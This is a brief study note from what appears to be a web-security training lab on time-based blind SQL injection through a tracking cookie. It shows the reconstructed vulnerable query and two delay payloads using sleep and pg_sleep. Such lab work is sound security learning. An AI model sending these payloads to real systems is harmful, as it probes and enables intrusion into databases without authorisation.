Lab #13 - Blind SQL Injection with time delays

Vulnerable parameter - tracking cookie

End Goal:
- to prove that the field is vulnerable to blind SQLi (time based)

Analysis:

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

' || (SELECT sleep(10))-- -x
' || (SELECT pg_sleep(10))-- 

script.py <url>